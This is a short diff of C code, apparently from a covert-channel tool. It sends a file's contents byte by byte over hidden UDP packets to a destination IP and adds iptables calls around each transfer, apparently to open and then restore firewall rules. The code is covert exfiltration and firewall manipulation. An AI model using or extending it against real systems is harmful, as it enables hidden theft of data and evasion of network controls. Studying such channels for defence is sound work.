@@ -57,6 +57,7 @@ void send_results(char *sip, char *dip, unsigned short sport, unsigned short dpo
     int max_delay = 1;
     double passed;
 
+    iptables(dip, true, PORT, false, false);
     if((file = fopen(filename, "rb")) == NULL) {
         perror("fopen can't open file");
         exit(1);
@@ -78,6 +79,8 @@ void send_results(char *sip, char *dip, unsigned short sport, unsigned short dpo
         covert_udp_send(sip, dip, sport, dport, (unsigned char *) &input, EOT);
     }
 
+    iptables(dip, true, PORT, false, true);
+
     fclose(file);
 }
 
@@ -88,11 +91,15 @@ int rand_delay(int delay) {
 
 void covert_udp_send_data(char *sip, char *dip, unsigned short sport, unsigned short dport, char* data, int flag){
 
+    iptables(dip, false, PORT, false, false);
+
     for(int i = 0; i< (int)strlen(data); i++){
         covert_udp_send(sip,dip,sport,dport,(unsigned char*) &data[i], flag);
     }
     //end of file
     covert_udp_send(sip,dip,sport,dport, (unsigned char*) &data[0], EOT);
+
+    iptables(dip, false, PORT, false, true);
 }
 
 void covert_udp_send(char *sip, char *dip, unsigned short sport, unsigned short dport, unsigned char* data, int flags){
